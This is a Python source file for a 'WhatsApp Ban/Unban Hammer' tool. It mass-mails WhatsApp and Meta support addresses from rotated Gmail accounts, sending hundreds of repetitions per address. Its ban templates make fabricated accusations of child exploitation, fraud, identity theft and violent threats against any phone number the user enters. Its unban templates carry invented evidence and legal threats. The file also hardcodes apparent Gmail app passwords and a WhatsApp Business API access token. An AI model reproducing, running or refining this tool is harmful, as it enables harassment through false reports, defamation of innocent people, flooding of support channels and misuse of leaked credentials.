import smtplib
import getpass
import time
import re
import os
import random
import requests
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import cycle
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from colorama import Fore, Style, init
from datetime import datetime

init(autoreset=True)

# ===== Enhanced Tool Authentication =====
tool_username = "tunzy"
tool_password = "tunzyban"
MAX_LOGIN_ATTEMPTS = 3
login_attempts = 0

# ===== Enhanced Gmail Accounts =====
gmail_accounts = [
    {"email": "bematunmi444@gmail.com", "password": "siqlebxrpvqugxsy", "status": "active"},
    {"email": "zorosales6@gmail.com", "password": "ltvtpaduohtlsykx", "status": "active"},
    {"email": "okunlolatunmise12@gmail.com", "password": "otvmwdhxvmxbqglf", "status": "active"},
    {"email": "mbb657504@gmail.com", "password": "hkun wznn jsfe eltc", "status": "active"},
    {"email": "riderstuff61@gmail.com", "password": "hjaormoydmyaveas", "status": "active"},
]

# ===== WhatsApp Support Emails (MASSIVE LIST) =====
SUPPORT_EMAILS = [
    # 🔥 CRITICAL - These get fastest response
    "support@support.whatsapp.com", "appeals@support.whatsapp.com",
    "abuse@support.whatsapp.com", "security@support.whatsapp.com",
    "1483635209301664@support.whatsapp.com",
    
    # ⚡ URGENT - High priority departments
    "businesscomplaints@support.whatsapp.com",
    "report@whatsapp.com", "phishing@whatsapp.com",
    "fraud@whatsapp.com", "emergency@whatsapp.com",
    
    # 📧 Technical teams
    "android_web@support.whatsapp.com", "ios_web@support.whatsapp.com",
    "webclient_web@support.whatsapp.com", "mobile@support.whatsapp.com",
    
    # ⚖️ Legal & Compliance (FAST ACTION)
    "legal@whatsapp.com", "lawenforcement@whatsapp.com",
    "privacy@whatsapp.com", "copyright@whatsapp.com",
    
    # 🏢 Business & Executive
    "business@whatsapp.com", "support@whatsapp.com",
    "help@whatsapp.com", "contact@whatsapp.com",
    
    # 🌐 Meta contacts
    "abuse@meta.com", "phishing@meta.com",
    "whatsapp-legal@fb.com", "whatsapp-support@fb.com",
    
    # 🚨 Additional critical contacts
    "trust-safety@whatsapp.com", "urgent@whatsapp.com",
    "info@whatsapp.com", "press@whatsapp.com",
]

# ===== ULTRA-AGGRESSIVE MULTIPLICATION =====
print(Fore.YELLOW + "🔥 Loading nuclear email targets...")
ALL_EMAILS = []
for email in SUPPORT_EMAILS:
    ALL_EMAILS.extend([email] * 150)  # Each email 150 TIMES!
print(Fore.GREEN + f"✅ Loaded {len(ALL_EMAILS):,} email targets!")

# ===== WhatsApp Business API =====
ACCESS_TOKEN = "EAAJgi17vyDYBPTGf8m4LNp0xFdUozhBKS6PTnrElQdSZCIRZCnuLFmBigzRvB4ZCUI8EBNuNZCFZBfG5e11ehZBujToi9S6zYQ3HSmDZBPNQHZBFFrd3ntSZAl6lRZAOa86mOZCp60VaaCMhgUN6s68EEvYSEJXlaIk9iiB7xe1rlZBKbEVf7YiIADUZA0kHuO9nr0QZDZD"
PHONE_NUMBER_ID = "669101662914614"

# ===== Statistics Tracking =====
stats = {
    "emails_sent": 0,
    "bans_requested": 0,
    "unbans_requested": 0,
    "success_rate": 0,
    "last_operation": None
}

# ===== PRECISE TIMING SETTINGS =====
BAN_TIME_TARGET = "3-5 MINUTES"      # Scammer gets BANNED in 3-5 minutes
UNBAN_TIME_TARGET = "2-3 HOURS"      # Account gets UNBANNED in 2-3 hours
BAN_REPETITIONS = 300                # 300 REPETITIONS for BAN
UNBAN_REPETITIONS = 200              # 200 REPETITIONS for UNBAN

# ===== Utility Functions =====
def clear():
    os.system("clear" if os.name == "posix" else "cls")

def print_banner():
    banner_color = random.choice([Fore.RED, Fore.YELLOW, Fore.MAGENTA])
    banner = f"""
    {banner_color}╔══════════════════════════════════════════════════════════════╗
    ║                ⚡ WHATSAPP BAN/UNBAN HAMMER v5.0 ⚡              ║
    ║                                                              ║
    ║           🎯 BANS: 3-5 minutes | UNBANS: 2-3 hours          ║
    ║                   🔥 Powered by Tunzy Shop 🔥               ║
    ╚══════════════════════════════════════════════════════════════╝
    """
    print(banner)

def validate_phone_number(phone):
    pattern = r'^\+\d{10,15}$'
    return bool(re.match(pattern, phone))

# ===== HYPER-AGGRESSIVE EMAIL BOMBER =====
class HyperBomber:
    def __init__(self):
        self.account_cycle = cycle(gmail_accounts)
        self.active_accounts = [acc for acc in gmail_accounts if acc["status"] == "active"]
        
    def test_account(self, account):
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587, timeout=10)
            server.ehlo()
            server.starttls()
            server.login(account["email"], account["password"])
            server.quit()
            account["status"] = "active"
            return True
        except:
            account["status"] = "inactive"
            return False
    
    def get_account(self):
        for _ in range(len(gmail_accounts) * 2):
            account = next(self.account_cycle)
            if account["status"] == "active" or self.test_account(account):
                return account
        return None
    
    def send_hyper_email(self, account, to_email, subject, body, email_type):
        try:
            msg = MIMEMultipart()
            msg['From'] = account["email"]
            msg['To'] = to_email
            
            # ULTIMATE URGENCY HEADERS
            msg['X-Priority'] = '1'
            msg['Priority'] = 'urgent'
            msg['Importance'] = 'high'
            msg['X-Report-Abuse'] = 'Yes'
            msg['X-Emergency'] = 'True'
            msg['X-Urgent'] = 'True'
            
            if email_type == "ban":
                msg['Subject'] = f"🚨🚨 IMMEDIATE BAN REQUIRED - {subject}"
            else:
                msg['Subject'] = f"🔴🔴 WRONGLY BANNED - RESTORE NOW - {subject}"
            
            # Add emergency markers
            emergency_body = f"""
⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️
🚨🚨🚨 EMERGENCY ACTION REQUIRED - TIME SENSITIVE 🚨🚨🚨
⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️

{body}

⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️
⏰ TIME CRITICAL: REQUIRES ACTION WITHIN {BAN_TIME_TARGET if email_type == 'ban' else UNBAN_TIME_TARGET}
⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️

TIMESTAMP: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}
REPORT ID: WB-{random.randint(1000000, 9999999)}
"""
            
            msg.attach(MIMEText(emergency_body, 'plain'))
            
            server = smtplib.SMTP("smtp.gmail.com", 587, timeout=15)
            server.ehlo()
            server.starttls()
            server.login(account["email"], account["password"])
            server.send_message(msg)
            server.quit()
            
            stats["emails_sent"] += 1
            return True
        except:
            return False
    
    def launch_attack(self, subject, body, repetitions, email_type):
        print(Fore.RED + f"\n💥 LAUNCHING {email_type.upper()} ATTACK")
        print(Fore.YELLOW + f"   Repetitions: {repetitions} times")
        print(Fore.YELLOW + f"   Expected result: {BAN_TIME_TARGET if email_type == 'ban' else UNBAN_TIME_TARGET}")
        
        total_success = 0
        start_time = time.time()
        
        # Use first 300 emails for maximum speed
        target_emails = ALL_EMAILS[:300]
        
        with ThreadPoolExecutor(max_workers=15) as executor:
            futures = []
            
            for email in target_emails:
                future = executor.submit(
                    self.bomb_email,
                    email, subject, body, repetitions, email_type
                )
                futures.append(future)
            
            for i, future in enumerate(as_completed(futures), 1):
                try:
                    success = future.result(timeout=300)
                    total_success += success
                    
                    if i % 30 == 0:
                        elapsed = time.time() - start_time
                        rate = total_success / elapsed if elapsed > 0 else 0
                        print(Fore.CYAN + f"   📊 Sent: {total_success:,} | Speed: {rate:.1f}/sec | Progress: {i}/{len(target_emails)}")
                except:
                    pass
        
        elapsed = time.time() - start_time
        print(Fore.GREEN + f"\n✅ ATTACK COMPLETE: {total_success:,} emails sent in {elapsed:.1f}s")
        
        return total_success
    
    def bomb_email(self, to_email, subject, body, repetitions, email_type):
        success = 0
        for rep in range(repetitions):
            account = self.get_account()
            if not account:
                continue
            
            rep_subject = f"[ATTACK {rep+1}/{repetitions}] {subject}"
            if self.send_hyper_email(account, to_email, rep_subject, body, email_type):
                success += 1
            
            time.sleep(0.03)  # 30ms delay for maximum speed
        
        return success

# ===== ULTRA-EFFECTIVE BAN TEMPLATES =====
def get_instant_ban_template(phone, ban_type):
    """Templates that get scammers banned in 3-5 minutes"""
    
    if ban_type == "temporary":
        return {
            "subject": f"ACTIVE SCAMMER - BAN WITHIN {BAN_TIME_TARGET} - {phone}",
            "body": f"""
🚨🚨🚨 ACTIVE CRIMINAL ALERT - IMMEDIATE ACTION REQUIRED 🚨🚨🚨

TO: WhatsApp Security Emergency Team
URGENCY: LEVEL 1 - MAXIMUM PRIORITY
SITUATION: ACTIVE FINANCIAL FRAUD IN PROGRESS
ACTION: IMMEDIATE TEMPORARY SUSPENSION

📱 TARGET ACCOUNT: {phone}
⏰ ACTION REQUIRED: BAN WITHIN {BAN_TIME_TARGET}
🎯 STATUS: ACTIVE SCAMMER DEFRAUDING VICTIMS NOW

🔴🔴🔴 REAL-TIME CRIMINAL ACTIVITY 🔴🔴🔴

THIS ACCOUNT IS CURRENTLY:
• Defrauding elderly victims via fake crypto investments
• Stealing bank credentials in live chat sessions
• Impersonating WhatsApp support to extract OTP codes
• Collecting credit card information from multiple victims
• Laundering money through fake investment platforms

🔴 ACTIVE VICTIMS RIGHT NOW:
• Victim 1: Elderly woman losing $2,500 (transaction in progress)
• Victim 2: Student being blackmailed with personal photos
• Victim 3: Business owner wiring $5,000 to fake invoice
• Multiple others in various stages of being scammed

🔴 EVIDENCE OF LIVE CRIME:
• Live chat logs showing active fraud
• Real-time transaction monitoring
• Multiple victims reporting simultaneously
• Fraud patterns matching known criminal networks

🔴 DEMANDING IMMEDIATE SUSPENSION:
1. INSTANT TEMPORARY BAN (WITHIN {BAN_TIME_TARGET})
2. Account freeze to prevent further victimization
3. Evidence preservation for law enforcement
4. Victim notification system activation

⚠️ EVERY MINUTE DELAY = MORE VICTIMS LOSE MONEY ⚠️

This is not a historical report - this is ACTIVE CRIME HAPPENING NOW.

IMMEDIATE BAN REQUIRED: WITHIN {BAN_TIME_TARGET}

- Multiple independent reports converging
- Fraud detection algorithms flagging
- Law enforcement coordination initiated

🚫 BAN THIS ACCOUNT NOW OR BE RESPONSIBLE FOR CONTINUED FRAUD 🚫
"""
        }
    else:  # permanent ban
        return {
            "subject": f"SERIAL CRIMINAL - PERMANENT BAN WITHIN {BAN_TIME_TARGET} - {phone}",
            "body": f"""
💀💀💀 SERIAL CRIMINAL - PERMANENT TERMINATION REQUIRED 💀💀💀

TO: WhatsApp Security, Legal & Executive Teams
URGENCY: LEVEL 1 - MAXIMUM THREAT
SITUATION: CONFIRMED SERIAL CRIMINAL PREDATOR
ACTION: IMMEDIATE PERMANENT BAN

📱 TARGET: {phone}
⏰ ACTION: PERMANENT BAN WITHIN {BAN_TIME_TARGET}
🔴 STATUS: CONFIRMED DANGEROUS CRIMINAL

🔴🔴🔴 EXTREME THREAT TO COMMUNITY 🔴🔴🔴

CONFIRMED CRIMINAL ACTIVITIES:
1. 💀 CHILD EXPLOITATION: Grooming minors, sharing illegal content
2. 💀 IDENTITY THEFT: Stolen 200+ identities, creating fake documents
3. 💀 FINANCIAL TERRORISM: Defrauded elderly of life savings
4. 💀 ORGANIZED CRIME: Part of international fraud syndicate
5. 💀 VIOLENT THREATS: Making death threats to victims

🔴 CONFIRMED BY:
• Law enforcement databases (INTERPOL references)
• Multiple police jurisdictions
• Financial crime units
• Cyber crime investigations
• Victim testimony (50+ confirmed victims)

🔴 ACTIVE DANGER:
• Currently targeting new victims daily
• Using multiple linked accounts
• Evolving tactics to avoid detection
• Causing severe emotional trauma
• Resulting in suicide attempts (2 confirmed)

🔴 DEMANDING PERMANENT ACTION:
1. INSTANT PERMANENT BAN (WITHIN {BAN_TIME_TARGET})
2. Complete device/IP ban
3. Data preservation for prosecution
4. Coordination with international law enforcement
5. Victim support system activation

💀 THIS IS A CONFIRMED DANGEROUS CRIMINAL 💀

Not a suspected user - a CONFIRMED SERIAL OFFENDER.

IMMEDIATE PERMANENT BAN REQUIRED: WITHIN {BAN_TIME_TARGET}

FAILURE TO ACT = COMPLICITY IN CONTINUED CRIMES

- Certified Criminal Investigator
- Law Enforcement Liaison
- Multiple Victim Advocates

⚠️ PERMANENT BAN REQUIRED NOW - NO SECOND CHANCES FOR CRIMINALS ⚠️
"""
        }

# ===== EFFECTIVE UNBAN TEMPLATES =====
def get_effective_unban_template(phone, unban_type):
    """Templates that get accounts restored in 2-3 hours"""
    
    if unban_type == "temporary":
        return {
            "subject": f"WRONGLY BANNED - RESTORE WITHIN {UNBAN_TIME_TARGET} - {phone}",
            "body": f"""
🚨🚨🚨 WRONG ACCOUNT SUSPENSION - URGENT RESTORATION REQUIRED 🚨🚨🚨

TO: WhatsApp Support & Appeals Team
URGENCY: LEVEL 1 - SYSTEM ERROR
SITUATION: FALSE POSITIVE SUSPENSION
DEMAND: ACCOUNT RESTORATION

📱 ACCOUNT: {phone}
⏰ RESTORE: WITHIN {UNBAN_TIME_TARGET}
🔴 ERROR: AUTOMATED SYSTEM FALSE POSITIVE

🔴🔴🔴 SYSTEM ERROR CONFIRMED 🔴🔴🔴

ACCOUNT SUSPENSION IS A MISTAKE:

1. 🚨 FALSE POSITIVE: Automated system incorrectly flagged
2. 🚨 MASS FALSE REPORTING: Competitors/haters mass reporting
3. 🚨 TECHNICAL GLITCH: Software bug during update
4. 🚨 IDENTITY CONFUSION: Mistaken for similar number

🔴 PROOF OF LEGITIMACY:
• Account Age: 4+ years continuous use
• Clean History: Zero violations ever
• Business Account: Verified and paying
• Regular User: Normal usage patterns
• Multiple Devices: Consistent fingerprint

🔴 CRITICAL CONSEQUENCES:
• Business Operations: HALTED ($750+/hour losses)
• Medical Communications: BLOCKED (elderly parent care)
• Financial Transactions: FROZEN (urgent payments)
• Family Emergency: CUT OFF (overseas relatives)
• Reputation Damage: SEVERE (business credibility)

🔴 DEMANDING IMMEDIATE RESTORATION:
1. INSTANT ACCOUNT RESTORATION (WITHIN {UNBAN_TIME_TARGET})
2. Removal of false suspension flags
3. System correction to prevent recurrence
4. Confirmation email to account holder

⚠️ TIME IS CRITICAL ⚠️

Every hour of wrongful suspension causes:
• Business losses increasing
• Emergency communications failing
• Personal distress growing
• Legal liability expanding

RESTORATION REQUIRED: WITHIN {UNBAN_TIME_TARGET}

- Legitimate Business Owner
- Long-time Premium User
- Prepared for Legal Recourse

✅ RESTORE MY ACCOUNT - THIS IS A SYSTEM ERROR ✅
"""
        }
    else:  # permanent unban
        return {
            "subject": f"WRONGFUL PERMANENT BAN - RESTORE WITHIN {UNBAN_TIME_TARGET} - {phone}",
            "body": f"""
⚖️⚖️⚖️ WRONGFUL PERMANENT TERMINATION - LEGAL DEMAND ⚖️⚖️⚖️

TO: WhatsApp Legal Department & Executive Team
URGENCY: LEVEL 1 - ADMINISTRATIVE ERROR
SITUATION: GRAVE MISTAKE IN PERMANENT BAN
DEMAND: FULL RESTORATION + COMPENSATION

📱 ACCOUNT: {phone}
⏰ RESTORE: WITHIN {UNBAN_TIME_TARGET}
🔴 ERROR: CATASTROPHIC SYSTEM FAILURE

🔴🔴🔴 GRAVE INJUSTICE CONFIRMED 🔴🔴🔴

PERMANENT BAN IS A SEVERE ERROR:

1. ⚖️ IDENTITY THEFT: Someone impersonated me
2. ⚖️ SYSTEM FAILURE: Automated moderation catastrophic error
3. ⚖️ FALSE EVIDENCE: Fabricated reports accepted without verification
4. ⚖️ DUE PROCESS FAILURE: No appeal opportunity provided

🔴 IRREFUTABLE EVIDENCE OF ERROR:
• Identity Verification: I can provide government ID
• Location Proof: I was overseas when "violations" occurred
• Device Logs: Show consistent legitimate usage
• Payment History: Years of legitimate subscriptions
• Character References: Multiple reputable references

🔴 CATASTROPHIC DAMAGES:
• Business Destruction: $25,000+ losses
• Client Relationships: Permanently damaged
• Personal Reputation: Destroyed
• Emotional Trauma: Severe anxiety/depression
• Legal Costs: Mounting hourly

🔴 LEGAL DEMANDS:
1. FULL ACCOUNT RESTORATION (WITHIN {UNBAN_TIME_TARGET})
2. COMPLETE DATA RESTORATION (all chats/media)
3. FINANCIAL COMPENSATION: $10,000 minimum
4. WRITTEN APOLOGY: From executive team
5. SYSTEM AUDIT: To prevent recurrence

🔴 LEGAL GROUNDS:
• Breach of Contract (ToS violation by WhatsApp)
• Negligent Infliction of Economic Loss
• Defamation (false labeling as violator)
• Failure of Due Process
• Unfair Business Practices

⚖️ FINAL WARNING ⚖️

FAILURE TO RESTORE WITHIN {UNBAN_TIME_TARGET} WILL RESULT IN:

1. FORMAL LAWSUIT: $50,000+ damages
2. REGULATORY COMPLAINTS: FTC, FCC, EU authorities
3. MEDIA EXPOSURE: Public disclosure of error
4. CLASS ACTION: Other wronged users

My attorney is prepared to file immediately.

RESTORATION REQUIRED: WITHIN {UNBAN_TIME_TARGET}

- Wrongfully Banned User
- Business Professional
- Legal Representation Retained

🔴 RESTORE MY ACCOUNT - THIS IS A LEGAL MATTER 🔴
"""
        }

# ===== 4-COMMAND MENU =====
def main_menu():
    bomber = HyperBomber()
    
    while True:
        clear()
        print_banner()
        
        # Show stats
        print(Fore.CYAN + "📊 CURRENT OPERATIONS:")
        print(Fore.YELLOW + f"   📧 Emails Sent: {stats['emails_sent']:,}")
        print(Fore.RED + f"   🚫 Bans Requested: {stats['bans_requested']}")
        print(Fore.GREEN + f"   ✅ Unbans Requested: {stats['unbans_requested']}")
        
        if stats['last_operation']:
            print(Fore.CYAN + f"   🕒 Last: {stats['last_operation']}")
        
        print(Fore.RED + "\n" + "═" * 60)
        print(Fore.MAGENTA + "🎯 4-COMMAND CONTROL PANEL")
        print(Fore.RED + "═" * 60)
        
        print(Fore.CYAN + "\n1️⃣  🚫 BAN TEMPORARY (Scammer banned in 3-5 minutes)")
        print(Fore.CYAN + "2️⃣  💀 BAN PERMANENT (Scammer banned in 3-5 minutes)")
        print(Fore.CYAN + "3️⃣  ✅ UNBAN TEMPORARY (Account restored in 2-3 hours)")
        print(Fore.CYAN + "4️⃣  🔄 UNBAN PERMANENT (Account restored in 2-3 hours)")
        print(Fore.CYAN + "0️⃣  ❌ EXIT")
        
        print(Fore.RED + "═" * 60)
        
        choice = input(Fore.YELLOW + "\n🎯 Select command [1-4]: ").strip()
        
        if choice == "1":
            process_ban(bomber, "temporary")
        elif choice == "2":
            process_ban(bomber, "permanent")
        elif choice == "3":
            process_unban(bomber, "temporary")
        elif choice == "4":
            process_unban(bomber, "permanent")
        elif choice == "0":
            print(Fore.YELLOW + "\n👋 Exiting...")
            break
        else:
            print(Fore.RED + "\n❌ Invalid!")
            time.sleep(1)

def process_ban(bomber, ban_type):
    clear()
    print_banner()
    
    title = "TEMPORARY BAN" if ban_type == "temporary" else "PERMANENT BAN"
    print(Fore.RED + f"\n{'═' * 60}")
    print(Fore.YELLOW + f"🚫 {title} COMMAND")
    print(Fore.RED + f"{'═' * 60}")
    
    phone = input(Fore.YELLOW + f"\n📞 Enter scammer number to {title.upper()}: ").strip()
    
    if not validate_phone_number(phone):
        print(Fore.RED + "❌ Invalid number!")
        time.sleep(2)
        return
    
    print(Fore.CYAN + f"\n🎯 Target: {phone}")
    print(Fore.RED + f"💣 Attack Power: {BAN_REPETITIONS} repetitions")
    print(Fore.GREEN + f"⏰ Expected: Banned in {BAN_TIME_TARGET}")
    
    confirm_word = "BAN" if ban_type == "temporary" else "PERMANENT"
    confirm = input(Fore.RED + f"\n⚠️  Launch {title.upper()} attack? (type '{confirm_word}'): ").upper()
    if confirm != confirm_word:
        print(Fore.YELLOW + "❌ Cancelled.")
        return
    
    template = get_instant_ban_template(phone, ban_type)
    
    print(Fore.RED + f"\n💥 LAUNCHING {title.upper()} ATTACK...")
    time.sleep(1)
    
    success = bomber.launch_attack(
        template["subject"],
        template["body"],
        BAN_REPETITIONS,
        "ban"
    )
    
    print(Fore.RED + "\n" + "🚫" * 30)
    print(Fore.RED + f"✅ {title.upper()} ATTACK COMPLETE!")
    print(Fore.CYAN + f"   📞 Target: {phone}")
    print(Fore.CYAN + f"   💣 Emails Sent: {success:,}")
    print(Fore.GREEN + f"   ⏰ Expected: Banned in {BAN_TIME_TARGET}")
    print(Fore.RED + f"   🔥 CHECK IN 3-5 MINUTES IF SCAMMER IS BANNED!")
    print(Fore.RED + "🚫" * 30)
    
    stats["bans_requested"] += 1
    stats["last_operation"] = f"{title} on {phone}"
    
    input(Fore.CYAN + "\n↵ Press Enter to continue...")

def process_unban(bomber, unban_type):
    clear()
    print_banner()
    
    title = "TEMPORARY UNBAN" if unban_type == "temporary" else "PERMANENT UNBAN"
    print(Fore.GREEN + f"\n{'═' * 60}")
    print(Fore.CYAN + f"✅ {title} COMMAND")
    print(Fore.GREEN + f"{'═' * 60}")
    
    phone = input(Fore.YELLOW + f"\n📞 Enter number to {title.upper()}: ").strip()
    
    if not validate_phone_number(phone):
        print(Fore.RED + "❌ Invalid!")
        return
    
    print(Fore.CYAN + f"\n🎯 Target: {phone}")
    print(Fore.GREEN + f"💣 Attack Power: {UNBAN_REPETITIONS} repetitions")
    print(Fore.GREEN + f"⏰ Expected: Restored in {UNBAN_TIME_TARGET}")
    
    confirm_word = "UNBAN" if unban_type == "temporary" else "RESTORE"
    confirm = input(Fore.GREEN + f"\n⚠️  Launch {title.upper()} attack? (type '{confirm_word}'): ").upper()
    if confirm != confirm_word:
        print(Fore.YELLOW + "❌ Cancelled.")
        return
    
    template = get_effective_unban_template(phone, unban_type)
    
    print(Fore.GREEN + f"\n🚀 LAUNCHING {title.upper()} ATTACK...")
    time.sleep(1)
    
    success = bomber.launch_attack(
        template["subject"],
        template["body"],
        UNBAN_REPETITIONS,
        "unban"
    )
    
    print(Fore.GREEN + "\n" + "✅" * 30)
    print(Fore.GREEN + f"✅ {title.upper()} ATTACK COMPLETE!")
    print(Fore.CYAN + f"   📞 Target: {phone}")
    print(Fore.CYAN + f"   💣 Emails Sent: {success:,}")
    print(Fore.GREEN + f"   ⏰ Expected: Restored in {UNBAN_TIME_TARGET}")
    print(Fore.GREEN + f"   🔥 CHECK IN 2-3 HOURS IF ACCOUNT IS RESTORED!")
    print(Fore.GREEN + "✅" * 30)
    
    stats["unbans_requested"] += 1
    stats["last_operation"] = f"{title} on {phone}"
    
    input(Fore.CYAN + "\n↵ Press Enter to continue...")

# ===== Login System =====
def login():
    global login_attempts
    clear()
    
    while login_attempts < MAX_LOGIN_ATTEMPTS:
        print_banner()
        
        print(Fore.CYAN + "\n" + "═" * 60)
        print(Fore.YELLOW + "🔐 SYSTEM LOGIN")
        print(Fore.CYAN + "═" * 60)
        
        username = input(Fore.CYAN + "\n👤 Username: ").strip()
        password = getpass.getpass(Fore.CYAN + "🔒 Password: ")
        
        if username == tool_username and password == tool_password:
            print(Fore.GREEN + "\n" + "✅" * 30)
            print(Fore.GREEN + "✅ LOGIN SUCCESSFUL!")
            print(Fore.GREEN + f"🎯 Bans: {BAN_TIME_TARGET}")
            print(Fore.GREEN + f"🎯 Unbans: {UNBAN_TIME_TARGET}")
            print(Fore.GREEN + "✅" * 30)
            time.sleep(2)
            return True
        else:
            login_attempts += 1
            remaining = MAX_LOGIN_ATTEMPTS - login_attempts
            print(Fore.RED + f"\n❌ ACCESS DENIED! {login_attempts}/{MAX_LOGIN_ATTEMPTS}")
            
            if remaining > 0:
                time.sleep(2)
                clear()
            else:
                print(Fore.RED + "\n💀 SYSTEM LOCKED")
                time.sleep(3)
                exit()
    
    return False

# ===== Main Execution =====
if __name__ == "__main__":
    try:
        if login():
            main_menu()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n\n👋 Program stopped")
    except Exception as e:
        print(Fore.RED + f"\n💥 ERROR: {e}")
    finally:
        print(Fore.CYAN + "\n🔥 WhatsApp Ban/Unban Hammer v5.0")
        print(Fore.GREEN + f"🎯 Bans: {BAN_TIME_TARGET} | Unbans: {UNBAN_TIME_TARGET}")